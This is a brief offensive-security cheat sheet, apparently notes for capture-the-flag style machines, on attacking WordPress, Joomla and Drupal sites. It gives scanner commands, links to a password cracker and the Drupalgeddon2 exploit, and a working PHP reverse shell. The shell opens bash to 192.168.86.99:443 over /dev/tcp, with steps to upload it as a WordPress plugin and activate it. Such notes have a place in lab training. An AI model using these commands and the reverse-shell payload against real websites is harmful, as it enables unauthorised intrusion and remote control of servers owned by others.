# # 1 Wordpress

---

## wpscan

```
  wpscan --url http://sandbox.local  --enumerate ap,at,cb,dbe -o sandbox.out
```

```
  ./wpscan –url http://IP/ –enumerate p
```

Sometimes it is convenient to use the aggressive mode of wpscan


## wordpress password cracker

https://github.com/MrSqar-Ye/wpCrack.git

## wordpress reverse shell admin panel

1. create php code

```
<?php

exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.86.99/443 0>&1'");
?>
```

1. zip the php
2. upload the zip as plugin
3. activate plugin

# 2 Joomla

---

ip/administrator/manifests/files/joomla.xml <- te da la version

## joomscan

```
joomscan -ec -u  http://curling.htb
```

# 3 DRUPAL

---

https://github.com/dreadlocked/Drupalgeddon2

```
droopescan scan drupal -u 10.10.10.102:80 
```
